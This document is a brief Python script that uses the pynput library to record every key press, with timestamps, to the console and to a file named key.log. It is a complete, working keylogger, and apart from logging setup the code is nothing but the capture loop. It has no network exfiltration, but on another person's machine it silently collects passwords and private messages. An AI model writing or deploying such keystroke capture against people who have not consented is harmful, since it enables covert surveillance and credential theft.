from pynput import keyboard
import logging 

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
file_handler = logging.FileHandler('key.log')
file_handler.setLevel(logging.INFO)

file_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
logging.getLogger('').addHandler(file_handler)

with keyboard.Listener(
        on_press = lambda key: logging.info("%s", key)) as listener:
    listener.join()
